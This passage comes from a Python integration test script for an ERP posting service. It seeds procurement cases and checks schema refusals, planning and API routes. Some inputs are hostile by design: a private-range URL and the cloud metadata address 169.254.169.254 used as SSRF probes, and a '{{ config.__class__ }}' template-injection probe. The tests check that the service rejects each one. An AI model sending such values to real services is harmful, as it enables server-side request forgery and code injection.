# Live database layer (one rolled-back transaction) + the committed concurrency gate
# ===========================================================================

PDF = "application/pdf"
T0 = datetime(2026, 9, 25, 6, 0, tzinfo=UTC)


class _StopRun(Exception):
    """A mutation run stops after the step it targets."""


@contextlib.contextmanager
def mock_targets():
    """The REST/OData mock (HTTPS, a self-signed certificate the test client trusts) and the SFTP mock (a pinned
    RSA host key), with the transports pointed at them for the duration only."""
    from erp_mock_targets import MockErp, MockSftp

    from app.core.ssrf_client import SSRFSafeHTTPClient
    from app.services.erp.transport import http as H
    from app.services.erp.transport import sftp as SF

    erp = MockErp().start()
    box = MockSftp().start()
    ctx = erp.client_ssl_context()
    saved = (H.client_factory, SF.allow_private_for_tests)
    H.client_factory = lambda timeout: SSRFSafeHTTPClient(connect_timeout=5, total_timeout=min(timeout, 15),
                                                          allow_private_ranges=True, test_ssl_context=ctx)
    SF.allow_private_for_tests = True
    try:
        yield erp, box
    finally:
        H.client_factory, SF.allow_private_for_tests = saved
        erp.stop()
        box.stop()


def rest_config(erp: Any, preset: str) -> dict:
    from app.services.erp import synthetic as S

    suffix = {"S4HANA_ODATA": "/sap/opu/odata/sap", "NETSUITE_REST": "/netsuite/services/rest/record/v1"}.get(preset, "")
    return {**json.loads(json.dumps(S.CONFIG)), "http": {"base_url": erp.base + suffix}}


def sftp_config(box: Any) -> dict:
    from app.services.erp import synthetic as S

    return {**json.loads(json.dumps(S.CONFIG)),
            "sftp": {"host": "127.0.0.1", "port": box.port, "host_key_sha256": box.fingerprint,
                     "directory": "/inbound", "ack_directory": "/acks"}}


class _Shared(dict):
    """ARCH47-S1:gate-dependencies. What one database gate leaves for a later one (D7's rejected posting for D9's
    hub, D6's QuickBooks target for D11's sweep). Reading something an earlier gate never left says so -- naming
    the gates that failed -- instead of a bare KeyError that hides the real failure."""

    def __init__(self, steps: list) -> None:
        super().__init__()
        self._steps = steps

    def __missing__(self, key: str) -> Any:
        failed = [name.split(" ", 1)[0] for name, ok, _ in self._steps if not ok]
        raise AssertionError(f"not run: needs {key!r} from an earlier gate, which did not complete"
                             + (f" (failed: {', '.join(failed)}; fix those first)" if failed else ""))


def live_e2e(patches: Optional[list] = None, until: Optional[str] = None) -> list[tuple[str, bool, str]]:
    import sqlalchemy as sa
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session

    from app.api import capability_gate, deps
    from app.api.v1 import erp as erp_api
    from app.api.v1 import review as review_api
    from app.api.v1.router import api_router
    from app.core.encryption import decrypt_secret
    from app.core.exception_handlers import domain_exception_handler
    from app.core.exceptions import FlowPilotError
    from app.db import session as session_module
    from app.db.session import engine
    from app.middleware.request_trace import RequestTraceMiddleware
    from app.models.erp import ErpLookupTable, ErpMapping, ErpPosting, ErpPostingAttempt, ErpTarget
    from app.models.job import Job
    from app.services import audit_service, outbox_service
    from app.services.automation.actions import base as action_base
    from app.services.automation.actions import erp_post
    from app.services.compliance import erasure_service
    from app.services.erp import presets as PR
    from app.services.erp import render as R
    from app.services.erp import service
    from app.services.erp import sources as SRC
    from app.services.erp import synthetic as S
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import tabular, x12
    from app.services.review import projection, resolution
    from app.workers import handlers as job_handlers

    job_handlers.register_all()
    Seeder = _load_module("_v40_47", BACKEND / "verify_arch40.py").Seeder
    sweeper = _load_module("_sweep47", F["sweep"])
    steps: list[tuple[str, bool, str]] = []

    conn = engine.connect()
    outer = conn.begin()
    db = Session(bind=conn, join_transaction_mode="create_savepoint", expire_on_commit=False)

    def step(name: str, fn, isolated: bool = False) -> None:
        try:
            if isolated:
                nested = db.begin_nested()
                try:
                    fn()
                finally:
                    if nested.is_active:
                        nested.rollback()
                    db.expire_all()
            else:
                fn()
            steps.append((name, True, ""))
        except Exception as exc:  # noqa: BLE001
            if os.environ.get("VERIFY_TRACE"):
                traceback.print_exc()
            with contextlib.suppress(Exception):
                db.rollback()
            where = [f"{Path(f.filename).name}:{f.lineno}" for f in traceback.extract_tb(exc.__traceback__)
                     if f.filename.endswith(".py") and "site-packages" not in f.filename][-3:]
            steps.append((name, False, f"{type(exc).__name__}: {exc}"[:800] + f"  at {' <- '.join(reversed(where))}"))
        if until and name.startswith(until):
            raise _StopRun

    held = {"value": True}
    emitted: list[tuple[str, Any, dict]] = []
    denials: list = []
    clock: dict[str, Optional[datetime]] = {"value": None}
    granted_keys = [KEY, "capability.reconciliation", "capability.entity_graph", "capability.table_intelligence",
                    "capability.case_intelligence"]
    real_now = service.now
    originals = [(capability_gate, "has_capability", capability_gate.has_capability),
                 (capability_gate, "granted_capabilities", capability_gate.granted_capabilities),
                 (audit_service, "record_independently", audit_service.record_independently),
                 (outbox_service, "emit_trigger", outbox_service.emit_trigger),
                 (session_module, "SessionLocal", session_module.SessionLocal), (service, "now", service.now)]
    capability_gate.has_capability = lambda *_a, capability_key=None, **_k: capability_key in granted_keys and (
        held["value"] or capability_key != KEY)
    capability_gate.granted_capabilities = lambda *_a, **_k: [k for k in granted_keys if held["value"] or k != KEY]
    audit_service.record_independently = lambda **kw: denials.append(kw)
    real_emit = outbox_service.emit_trigger

    def recording_emit(*a, **kw):
        emitted.append((kw.get("event_type"), kw.get("idempotency_key"), kw.get("payload") or {}))
        return real_emit(*a, **kw)

    outbox_service.emit_trigger = recording_emit
    service.now = lambda: clock["value"] or real_now()

    @contextlib.contextmanager
    def at(moment: datetime):
        saved = clock["value"]
        clock["value"] = moment
        try:
            yield
        finally:
            clock["value"] = saved

    class _Scoped:
        def __call__(self):
            return self

        def __enter__(self):
            return db

        def __exit__(self, *exc):
            return False

    session_module.SessionLocal = _Scoped()
    quiet = [logging.getLogger(n) for n in ("app.workers.handlers.erp", "app.services.erp.service",
                                            "app.services.outbox_service", "paramiko", "paramiko.transport")]
    levels = [q.level for q in quiet]
    for q in quiet:
        q.setLevel(logging.CRITICAL)
    for target, attr, value in patches or []:
        originals.append((target, attr, getattr(target, attr)))
        setattr(target, attr, value)
    s: dict[str, Any] = _Shared(steps)
    stack = contextlib.ExitStack()
    try:
        erp, box = stack.enter_context(mock_targets())
        seed = Seeder(conn)
        org, user, user2 = uuid.uuid4(), uuid.uuid4(), uuid.uuid4()
        ws, ws2 = uuid.uuid4(), uuid.uuid4()
        seed.insert("organizations", id=org, name="arch47 Globex", slug=f"arch47-{org.hex[:8]}", status="ACTIVE")
        for uid, tag in ((user, "a"), (user2, "b")):
            seed.insert("users", id=uid, email=f"{tag}-{org.hex[:8]}@arch47.test", is_active=True, is_superuser=False,
                        is_verified=True, timezone="UTC", locale="en")
        for wid, name in ((ws, "ap"), (ws2, "other")):
            seed.insert("workspaces", id=wid, organization_id=org, workspace_name=name, slug=f"{name}-{org.hex[:6]}",
                        status="ACTIVE", timezone="Asia/Kolkata", language="en", currency="INR", date_format="DD/MM/YYYY")
        seed.insert("workspace_members", id=uuid.uuid4(), user_id=user, workspace_id=ws, role="ADMIN", status="ACTIVE")
        seed.insert("workspace_members", id=uuid.uuid4(), user_id=user2, workspace_id=ws, role="CONTRIBUTOR", status="ACTIVE")
        vendor = uuid.uuid4()
        seed.insert("entities", id=vendor, organization_id=org, workspace_id=ws, kind="ORGANIZATION",
                    display_name="Acme Technology Services Pvt Ltd", normalized_name="acme technology services pvt ltd",
                    status="ACTIVE", mention_count=0)

        def document(fields: dict, name: str, workspace: uuid.UUID = ws, *, vendor_mention: bool = True) -> uuid.UUID:
            wid = uuid.uuid4()
            seed.insert("work_items", id=wid, workspace_id=workspace, original_filename=name,
                        stored_filename=f"arch47/{wid}.pdf", file_type=PDF, file_size=100, page_count=1,
                        extracted_text=name, extracted_entities=json.dumps(fields), created_by_user_id=user,
                        pipeline_stage="COMPLETED")
            if vendor_mention and workspace == ws:
                seed.insert("entity_mentions", id=uuid.uuid4(), workspace_id=workspace, work_item_id=wid, entity_id=vendor,
                            entity_kind="ORGANIZATION", field_path="parties[0]", ordinal=0, role="vendor",
                            surface_name="Acme Technology Services Pvt Ltd", spec_digest="a" * 64, decision="AUTO",
                            method="NEW", source="PRESET")
            return wid

        def approved_case(n: int, *, status: str = "APPROVED", resolved: Optional[datetime] = None,
                          workspace: uuid.UUID = ws) -> tuple[uuid.UUID, dict]:
            docs = {
                "invoice": document({"invoice_number": f"INV-47-{n:04d}", "invoice_date": "01/09/2026",
                                     "vendor_name": "Acme Technology Services Pvt Ltd", "subtotal": "100000.00",
                                     "tax_amount": "18000.00", "total_amount": "118000.00", "currency": "INR",
                                     "po_number": f"PO-47-{n:04d}", "payment_terms": "Net 30"}, f"invoice-{n}.pdf", workspace),
                "po": document({"po_number": f"PO-47-{n:04d}", "po_date": "20/08/2026", "vendor_name": "Acme Technology Services Pvt Ltd",
                                "total_amount": "118000.00", "currency": "INR"}, f"po-{n}.pdf", workspace),
                "receipt": document({"receipt_number": f"GRN-47-{n:04d}", "receipt_date": "28/08/2026",
                                     "po_number": f"PO-47-{n:04d}"}, f"grn-{n}.pdf", workspace),
            }
            case = seed.insert("procurement_cases", id=uuid.uuid4(), organization_id=org, workspace_id=workspace,
                               po_work_item_id=docs["po"], invoice_work_item_id=docs["invoice"],
                               receipt_work_item_id=docs["receipt"], status=status, input_digest="c" * 64,
                               policy_version="arch47", line_count=2, exception_count=0, variance_micros=0,
                               resolved_at=resolved or T0, resolved_by_user_id=user)
            for i, (desc, sku, qty, price) in enumerate((("Managed IT services, September", "SVC-100", 1, 60000),
                                                         ("Laptop docking station", "HW-200", 8, 5000))):
                seed.insert("procurement_case_lines", id=uuid.uuid4(), organization_id=org, workspace_id=workspace,
                            case_id=case["id"], line_number=i + 1, outcome="MATCHED", description=desc, sku=sku,
                            po_line_index=i, po_quantity=qty, po_unit_price_micros=price * 1_000_000,
                            po_amount_micros=qty * price * 1_000_000, invoice_line_index=i, invoice_quantity=qty,
                            invoice_unit_price_micros=price * 1_000_000, invoice_amount_micros=qty * price * 1_000_000,
                            receipt_line_index=i, receipt_quantity=qty)
            return case["id"], docs

        def fill_lookups(target: ErpTarget, **extra: dict) -> None:
            prefix = target.config.get("lookup_prefix")
            for base, entries in (("vendors", {str(vendor): "56"}), ("accounts", dict(S.LOOKUPS["accounts"])),
                                  ("items", dict(S.LOOKUPS["items"])), ("settings", dict(S.LOOKUPS["settings"]))):
                row = db.execute(sa.select(ErpLookupTable).where(ErpLookupTable.workspace_id == target.workspace_id,
                                                                 ErpLookupTable.name == f"{prefix}_{base}")).scalar_one()
                row.entries = {**entries, **extra.get(base, {})}
            db.flush()

        def target(name: str, fmt: str, transport: str, preset: str = "NONE", *, config: Optional[dict] = None,
                   ack_mode: Optional[str] = None, auth_mode: Optional[str] = None, credential: Optional[dict] = None,
                   **kw: Any) -> ErpTarget:
            t_ = service.create_target(db, organization_id=org, workspace_id=kw.pop("workspace", ws), actor_user_id=user,
                                       name=name, format=fmt, transport=transport, preset=preset, ack_mode=ack_mode,
                                       auth_mode=auth_mode, config=config if config is not None else json.loads(json.dumps(S.CONFIG)),
                                       credential=credential, check_network=False, **kw)
            fill_lookups(t_)
            return t_

        def postings_of(t_: ErpTarget) -> list[ErpPosting]:
            return list(db.execute(sa.select(ErpPosting).where(ErpPosting.target_id == t_.id)
                                   .order_by(ErpPosting.created_at, ErpPosting.object_kind)).scalars())

        def deliver(p: ErpPosting) -> dict:
            db.commit()   # the claim and the record commit in the delivery's own steps
            out = service.deliver(db, p.id)
            db.expire_all()
            return out

        def failed_keys(p: ErpPosting) -> list[str]:
            return sorted(k for e, k, _ in emitted if e == v.EVENT_POSTING_FAILED and str(p.id) in (k or ""))

        def refused(fn) -> bool:
            try:
                with db.begin_nested():
                    fn()
                    db.flush()
            except Exception:  # noqa: BLE001
                return True
            return False

        # ------------------------------------------------------------------ D2 drift
        def d2() -> None:
            from alembic.autogenerate import compare_metadata
            from alembic.migration import MigrationContext

            import app.models  # noqa: F401
            from app.db.base import Base

            diff = compare_metadata(MigrationContext.configure(conn, opts={"compare_type": True}), Base.metadata)
            flat = []
            for d in diff:
                flat.extend(d if isinstance(d, list) else [d])
            bad = []
            for d in flat:
                if d[0] not in ("modify_type", "add_column", "remove_column", "modify_nullable", "add_table", "remove_table"):
                    continue
                names = {getattr(x, "name", None) for x in d[1:] if hasattr(x, "name")} | {x for x in d[1:] if isinstance(x, str)}
                table_obj = next((x for x in d[1:] if x.__class__.__name__ == "Table"), None)
                if names & set(TABLES) or (table_obj is not None and table_obj.name in TABLES):
                    bad.append(str(d)[:160])
            assert not bad, bad

        step("D2 models match the migration: zero column-level drift on the five ARCH-47 tables", d2)

        # ------------------------------------------------------------------ D3 schema refusals
        def d3() -> None:
            case_id, docs = approved_case(1)
            t_ = target("D3 CSV", "CSV", "DOWNLOAD")
            with at(T0):
                p, created = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                          object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user)
            assert created and p.state == "DELIVERED"
            cols = {c.key: getattr(p, c.key) for c in ErpPosting.__table__.columns}

            def row(**kw) -> ErpPosting:
                base = dict(cols, id=uuid.uuid4(), idempotency_key=uuid.uuid4().hex * 2, source_id=uuid.uuid4())
                base.update(kw)
                return ErpPosting(**base)

            stamp = datetime.now(UTC)
            other_t = target("D3 other ws", "CSV", "DOWNLOAD", workspace=ws2)
            checks = {
                "an unknown state": lambda: db.add(row(state="POSTED")),
                "a queued posting without its bytes": lambda: db.add(row(state="PENDING", rendered=None)),
                "DONE without an acknowledgement time": lambda: db.add(row(state="DONE", acknowledged_at=None)),
                "an acknowledgement time on an open posting": lambda: db.add(row(acknowledged_at=stamp)),
                "SENDING without a lease": lambda: db.add(row(state="SENDING", lease_token=None, lease_until=None)),
                "a lease on a posting not sending": lambda: db.add(row(lease_token=uuid.uuid4(), lease_until=stamp)),
                "RETRYING without a due time": lambda: db.add(row(state="RETRYING", next_attempt_at=None)),
                "an exception never counted": lambda: db.add(row(state="REJECTED", exception_seq=0)),
                "CANCELLED without a time": lambda: db.add(row(state="CANCELLED")),
                "erased with content kept": lambda: db.add(row(erased_at=stamp)),
                "a second posting of the same object": lambda: db.add(row(source_id=case_id)),
                "the same idempotency key twice": lambda: db.add(row(idempotency_key=p.idempotency_key)),
                "a key that is not sha256 hex": lambda: db.add(row(idempotency_key="Z" * 64)),
                "a lower-case currency": lambda: db.add(row(currency="inr")),
                "an unknown object": lambda: db.add(row(object_kind="INVOICE")),
                "another workspace's target": lambda: db.add(row(target_id=other_t.id)),
                "a nested lookup entry": lambda: db.add(ErpLookupTable(id=uuid.uuid4(), organization_id=org, workspace_id=ws,
                                                                       name="nested", entries={"a": {"b": "c"}})),
                "a numeric lookup value": lambda: db.add(ErpLookupTable(id=uuid.uuid4(), organization_id=org, workspace_id=ws,
                                                                        name="numeric", entries={"a": 1})),
                "JSON over SFTP": lambda: db.execute(sa.update(ErpTarget).where(ErpTarget.id == t_.id).values(
                    format="JSON", preset="QUICKBOOKS_ONLINE")),
                "a credential on a download target": lambda: db.execute(sa.update(ErpTarget).where(ErpTarget.id == t_.id)
                                                                        .values(credential_ciphertext="x", credential_fingerprint="abc")),
                "two active mappings for one object": lambda: db.add(ErpMapping(
                    id=uuid.uuid4(), organization_id=org, workspace_id=ws, target_id=t_.id, object_kind="VENDOR_BILL",
                    version=99, status="ACTIVE", spec={"language": "fp-map/1"}, spec_sha="b" * 64)),
                "an attempt numbered twice": lambda: db.add(ErpPostingAttempt(
                    id=uuid.uuid4(), posting_id=p.id, workspace_id=ws, seq=1, kind="SEND", outcome="OK", detail={},
                    started_at=stamp, finished_at=stamp)),
                "deleting a target that has postings": lambda: db.execute(sa.delete(ErpTarget).where(ErpTarget.id == t_.id)),
            }
            accepted = [name for name, fn in checks.items() if not refused(fn)]
            assert not accepted, f"the schema accepted: {accepted}"
            assert not refused(lambda: db.add(row())), "a valid posting was refused"
            # deleting the document unlinks the posting (the ledger keeps its row); deleting the workspace removes all
            db.execute(sa.text("DELETE FROM entity_mentions WHERE work_item_id = :w"), {"w": docs["invoice"]})
            db.execute(sa.text("DELETE FROM work_items WHERE id = :w"), {"w": docs["invoice"]})
            db.expire_all()
            kept = db.get(ErpPosting, p.id)
            assert kept is not None and kept.work_item_id is None, "deleting a document deleted (or kept pointing at) its posting"

        step("D3 schema refusals: ledger and idempotency keys unique, state CHECKs (bytes, leases, retries, acks, "
             "exceptions, erasure), composite FKs, flat lookup tables, one active mapping; a document's deletion "
             "unlinks, a target with postings cannot be deleted", d3, isolated=True)

        # ------------------------------------------------------------------ D4 sources and planning
        def d4() -> None:
            case_id, docs = approved_case(2)
            t_ = target("AP CSV", "CSV", "DOWNLOAD")
            with at(T0):
                results = {}
                for kind in v.OBJECT_KINDS:
                    p, created = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                              object_kind=kind, origin="MANUAL", actor_user_id=user)
                    results[kind] = (p, created)
            assert all(c for _, c in results.values()), {k: c for k, (_, c) in results.items()}
            assert {k: p.state for k, (p, _) in results.items()} == {k: "DELIVERED" for k in v.OBJECT_KINDS}, \
                {k: (p.state, p.last_error) for k, (p, _) in results.items()}
            bill = results["VENDOR_BILL"][0]
            assert (bill.document_number, bill.amount, bill.currency) == ("INV-47-0002", Decimal("118000.00"), "INR"), \
                (bill.document_number, bill.amount, bill.currency)
            assert bill.canonical["vendor"]["entity_id"] == str(vendor), "not posted against the ARCH-42 record"
            assert bill.canonical["due_date"] == "2026-10-01", bill.canonical["due_date"]   # 1 Sep + Net 30
            assert bill.mapping_version == 1 and bill.content_sha == hashlib.sha256(bytes(bill.rendered)).hexdigest()
            assert not R.validate_rendered(R.TargetView("CSV", "NONE", t_.config), "VENDOR_BILL", bytes(bill.rendered))
            je = results["JOURNAL_ENTRY"][0]
            rows = tabular.read_csv(bytes(je.rendered))
            acct = rows[0].index("Account")
            assert [r[acct] for r in rows[1:]] == ["64", "65", "31", "33"], rows   # lines, TAX, AP -- none guessed
            gr = results["GOODS_RECEIPT"][0]
            assert gr.work_item_id == docs["receipt"] and results["PURCHASE_ORDER"][0].work_item_id == docs["po"]
            again, created = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case_id,
                                          object_kind="VENDOR_BILL", origin="FLOW", actor_user_id=None)
            assert not created and again.id == bill.id, "planning twice made a second posting"
            count = db.execute(sa.select(sa.func.count()).select_from(ErpPosting).where(ErpPosting.target_id == t_.id)).scalar_one()
            assert count == 5
            pending, _ = approved_case(3, status="NEEDS_REVIEW")
            err = _raises(lambda: service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=pending,
                                               object_kind="VENDOR_BILL", origin="MANUAL", actor_user_id=user), service.ErpError)
            assert err is not None and err.code == "NOT_APPROVED", err
            # a missing lookup key: the posting FAILS at render with the key, the table and the line; nothing is sent
            fill_lookups(t_)
            prefix = t_.config["lookup_prefix"]
            table = db.execute(sa.select(ErpLookupTable).where(ErpLookupTable.name == f"{prefix}_accounts",
                                                               ErpLookupTable.workspace_id == ws)).scalar_one()
            table.entries = {k: val for k, val in table.entries.items() if k != "AP"}
            db.flush()
            case4, _ = approved_case(4)
            with at(T0):
                bad, _ = service.plan(db, target=t_, source_kind="PROCUREMENT_CASE", source_id=case4,
                                      object_kind="JOURNAL_ENTRY", origin="MANUAL", actor_user_id=user)
            assert bad.state == "FAILED" and bad.rendered is None and "'AP' is not in the lookup table" in (bad.last_error or ""), \
                (bad.state, bad.last_error)
            assert failed_keys(bad) == [f"{v.EVENT_POSTING_FAILED}:{bad.id}:1"], failed_keys(bad)
            s.update(case=case_id, docs=docs, csv=t_, bill=bill, je_failed=bad, case4=case4)

        step("D4 sources and planning: an APPROVED three-way match yields all five objects on the ARCH-42 vendor record "
             "(due date from the terms), rendered once and valid; planning again finds the same posting; an "
             "unapproved match is refused; a missing role account FAILS at render, raising posting.failed once", d4)

        # ------------------------------------------------------------------ HTTP
        ctx = SimpleNamespace(workspace_id=ws, organization_id=org, user_id=user, role="ADMIN")
        app = FastAPI()
        app.add_middleware(RequestTraceMiddleware)
        app.include_router(api_router, prefix="/api/v1")
        app.add_exception_handler(FlowPilotError, domain_exception_handler)
        app.dependency_overrides[deps.get_db] = lambda: db
        for module in (erp_api, review_api):
            for name in ("RequireViewer", "RequireContributor", "RequireAdmin"):
                if hasattr(module, name):
                    app.dependency_overrides[getattr(module, name)] = lambda: ctx
        for name in ("RequireWorkspaceContributor", "RequireWorkspaceViewer", "RequireWorkspaceAdmin"):
            if hasattr(deps, name):
                app.dependency_overrides[getattr(deps, name)] = lambda: ctx
        client = TestClient(app)
        s["client"] = client
        base = f"/api/v1/workspaces/{ws}"

        def d5() -> None:
            bill, t_ = s["bill"], s["csv"]
            mapping = f"/erp/targets/{t_.id}/mappings/VENDOR_BILL"
            lookup_id = db.execute(sa.select(ErpLookupTable.id).where(ErpLookupTable.workspace_id == ws)).scalars().first()
            routes = [("get", "/erp/catalog"), ("get", "/erp/targets"), ("post", "/erp/targets"), ("get", f"/erp/targets/{t_.id}"),
                      ("patch", f"/erp/targets/{t_.id}"), ("delete", f"/erp/targets/{t_.id}"),
                      ("put", f"/erp/targets/{t_.id}/credential"), ("post", f"/erp/targets/{t_.id}/test"),
                      ("get", mapping), ("put", mapping), ("post", mapping + "/validate"), ("post", mapping + "/default"),
                      ("get", "/erp/lookups"), ("post", "/erp/lookups"), ("patch", f"/erp/lookups/{lookup_id}"),
                      ("delete", f"/erp/lookups/{lookup_id}"), ("get", "/erp/outcomes"), ("get", "/erp/postings"),
                      ("post", "/erp/postings"), ("post", "/erp/postings/preview"), ("get", f"/erp/postings/{bill.id}"),
                      ("get", f"/erp/postings/{bill.id}/file"), ("post", f"/erp/postings/{bill.id}/retry"),
                      ("post", f"/erp/postings/{bill.id}/accept"), ("post", f"/erp/postings/{bill.id}/cancel"),
                      ("post", f"/erp/postings/{bill.id}/acknowledge"), ("get", f"/work-items/{s['docs']['po']}/postings")]
            assert len(routes) == 27
            post_body = {"target_id": str(t_.id), "source_kind": "PROCUREMENT_CASE", "source_id": str(s["case"]),
                         "object_kinds": ["VENDOR_BILL"]}
            bodies = {"/erp/targets": {"name": "x", "format": "CSV", "transport": "DOWNLOAD"},
                      f"/erp/targets/{t_.id}/credential": {"credential": {"token": "x"}},
                      mapping: {"spec": {}}, mapping + "/validate": {"spec": {}}, "/erp/lookups": {"name": "x"},
                      "/erp/postings": post_body, "/erp/postings/preview": {k: val for k, val in post_body.items() if k != "object_kinds"} | {"object_kind": "VENDOR_BILL"},
                      f"/erp/postings/{bill.id}/acknowledge": {"accepted": True}}
            held["value"] = False
            try:
                for method, path in routes:
                    body = bodies.get(path, {} if method in ("post", "patch", "put") else None)
                    r = client.request(method.upper(), base + path, **({"json": body} if body is not None else {}))
                    assert r.status_code == 402 and "CAPABILITY" in r.text.upper(), (method, path, r.status_code, r.text[:200])
                assert any((d.get("details") or {}).get("capability_key") == KEY for d in denials), "402 without the denial audit"
                assert "POSTING" not in review_api._allowed_kinds(db, ctx), "the hub shows POSTING without the plan"
            finally:
                held["value"] = True
            assert "POSTING" in review_api._allowed_kinds(db, ctx)
            cat = client.get(base + "/erp/catalog").json()
            assert cat["language"] == "fp-map/1" and len(cat["presets"]) == 7 and "number" in cat["transforms"], cat.keys()
            # targets: create (DOWNLOAD), refuse a private URL, refuse a secret in the configuration
            made = client.post(base + "/erp/targets", json={"name": "Tally import", "format": "TALLY", "transport": "DOWNLOAD",
                                                            "config": {"tally": {"company": "Globex Manufacturing Ltd"}}})
            assert made.status_code == 201, made.text[:300]
            tally_t = made.json()
            assert {m["object_kind"] for m in tally_t["mappings"]} == set(PR.supported_objects("TALLY", "NONE"))
            assert len(tally_t["lookup_tables"]) == 4 and all(n.startswith("tally_import_") for n in tally_t["lookup_tables"])
            private = client.post(base + "/erp/targets", json={
                "name": "internal", "format": "JSON", "transport": "HTTP", "preset": "GENERIC_REST", "auth_mode": "BEARER",
                "config": {"http": {"base_url": "https://10.1.2.3"}, "rest": {"paths": {"VENDOR_BILL": "/bills"}}}})
            assert private.status_code == 422 and ("10.1.2.3" in private.text or "private" in private.text.lower()
                                                   or "refused" in private.text.lower()), private.text[:300]
            meta = client.post(base + "/erp/targets", json={
                "name": "metadata", "format": "JSON", "transport": "HTTP", "preset": "GENERIC_REST", "auth_mode": "BEARER",
                "config": {"http": {"base_url": "https://169.254.169.254"}, "rest": {"paths": {"VENDOR_BILL": "/bills"}}}})
            assert meta.status_code == 422, meta.text[:200]
            assert client.post(base + "/erp/targets", json={"name": "Tally import", "format": "CSV", "transport": "DOWNLOAD"}).status_code == 409
            assert client.post(base + "/erp/targets", json={"name": "bad", "format": "JSON", "transport": "DOWNLOAD"}).status_code == 422
            # credentials: stored encrypted, shown only as a fingerprint, never audited in the clear
            rest_t = target("REST (API)", "JSON", "HTTP", "GENERIC_REST", config=rest_config(erp, "GENERIC_REST"), auth_mode="BEARER")
            cred = client.put(base + f"/erp/targets/{rest_t.id}/credential", json={"credential": {"token": "static-token"}})
            assert cred.status_code == 200 and cred.json()["credential_set"] and cred.json()["credential_fingerprint"], cred.text[:200]
            db.refresh(rest_t)
            assert "static-token" not in (rest_t.credential_ciphertext or "") and \
                json.loads(decrypt_secret(rest_t.credential_ciphertext)) == {"token": "static-token"}
            logs = db.execute(sa.text("SELECT details::text FROM audit_logs WHERE organization_id = :o"), {"o": org}).scalars().all()
            assert logs and not any("static-token" in (x or "") for x in logs), "a credential reached the audit log"
            assert "static-token" not in client.get(base + f"/erp/targets/{rest_t.id}").text
            bad_cred = client.put(base + f"/erp/targets/{rest_t.id}/credential", json={"credential": {"password": "x"}})
            assert bad_cred.status_code == 422, bad_cred.text[:200]
            tested = client.post(base + f"/erp/targets/{rest_t.id}/test").json()
            assert tested["detail"].get("status") is not None, tested   # reached the mock (nothing posted)
            # mappings: read, validate (refusal with the location), save a version, restore the default
            got = client.get(base + mapping).json()
            assert got["active"]["version"] == 1 and got["default_spec"]["language"] == "fp-map/1"
            evil = json.loads(json.dumps(got["active"]["spec"]))
            evil["header"].append({"to": "Note", "value": {"const": "{{ config.__class__ }}"}})
            check = client.post(base + mapping + "/validate", json={"spec": evil}).json()
            assert not check["valid"] and any("template" in p for p in check["problems"]), check
            assert client.put(base + mapping, json={"spec": evil}).status_code == 422, "an executable mapping was saved"
            better = json.loads(json.dumps(got["active"]["spec"]))
            better["header"].append({"to": "Source", "value": {"const": "FlowPilot"}})
            saved = client.put(base + mapping, json={"spec": better, "note": "add a source column"})
            assert saved.status_code == 200 and saved.json()["version"] == 2, saved.text[:300]
            versions = client.get(base + mapping).json()
            assert versions["active"]["version"] == 2 and [m["status"] for m in versions["versions"]][:2] == ["ACTIVE", "RETIRED"]
            restored = client.post(base + mapping + "/default").json()
            assert restored["version"] == 3 and restored["spec_sha"] == got["active"]["spec_sha"]
            assert db.get(ErpPosting, bill.id).mapping_version == 1, "a new mapping version changed a planned posting"
            # lookup tables
            made_lk = client.post(base + "/erp/lookups", json={"name": "cost_centres", "entries": {"SVC-100": "CC-10"}})
            assert made_lk.status_code == 201, made_lk.text[:200]
            lk = made_lk.json()
            assert client.patch(base + f"/erp/lookups/{lk['id']}", json={"entries": {"x": {"nested": "no"}}}).status_code == 422
            merged = client.patch(base + f"/erp/lookups/{lk['id']}", json={"entries": {"HW-200": "CC-20"}, "merge": True}).json()
            assert merged["entries"] == {"SVC-100": "CC-10", "HW-200": "CC-20"} and merged["revision"] == 2
            in_use = next(x for x in client.get(base + "/erp/lookups").json()["items"] if x["name"] == f"{t_.config['lookup_prefix']}_accounts")
            assert in_use["used_by"] and client.delete(base + f"/erp/lookups/{in_use['id']}").status_code == 409
            assert client.delete(base + f"/erp/lookups/{lk['id']}").status_code == 204
            # outcomes, preview, post, list, detail, file, acknowledge
            outcomes = client.get(base + "/erp/outcomes").json()["items"]
            mine = next(o for o in outcomes if o["id"] == str(s["case"]))
            assert set(mine["objects"]) == set(v.OBJECT_KINDS) and any(p_["posting_id"] == str(bill.id) for p_ in mine["postings"])
            pv = client.post(base + "/erp/postings/preview", json={"target_id": tally_t["target"]["id"], "source_kind": "PROCUREMENT_CASE",
                                                                   "source_id": str(s["case"]), "object_kind": "VENDOR_BILL"}).json()
            assert pv["problems"] or pv["ok"], pv
            fill_lookups(db.get(ErpTarget, uuid.UUID(tally_t["target"]["id"])))
            pv = client.post(base + "/erp/postings/preview", json={"target_id": tally_t["target"]["id"], "source_kind": "PROCUREMENT_CASE",
                                                                   "source_id": str(s["case"]), "object_kind": "VENDOR_BILL"}).json()
            assert pv["ok"] and "<VOUCHER" in pv["rendered_preview"] and not pv["problems"], pv
            before = db.execute(sa.select(sa.func.count()).select_from(ErpPosting)).scalar_one()
            assert db.execute(sa.select(sa.func.count()).select_from(ErpPosting)).scalar_one() == before, "a preview posted"
            first = client.post(base + "/erp/postings", json={**post_body, "target_id": tally_t["target"]["id"],
                                                               "object_kinds": ["VENDOR_BILL", "JOURNAL_ENTRY"]})
            assert first.status_code == 201, first.text[:300]
            res = {r["object_kind"]: r for r in first.json()["results"]}
            assert all(r["created"] and r["state"] == "DELIVERED" for r in res.values()), res
            second = client.post(base + "/erp/postings", json={**post_body, "target_id": tally_t["target"]["id"],
                                                                "object_kinds": ["VENDOR_BILL"]}).json()["results"][0]
            assert not second["created"] and second["posting_id"] == res["VENDOR_BILL"]["posting_id"], second
            ubl = target("UBL partner", "UBL", "DOWNLOAD")
            unsupported = client.post(base + "/erp/postings", json={**post_body, "target_id": str(ubl.id),
                                                                     "object_kinds": ["JOURNAL_ENTRY"]}).json()["results"][0]
            assert unsupported["posting_id"] is None and "does not take" in (unsupported["error"] or ""), unsupported
            listed = client.get(base + "/erp/postings", params={"target_id": tally_t["target"]["id"]}).json()
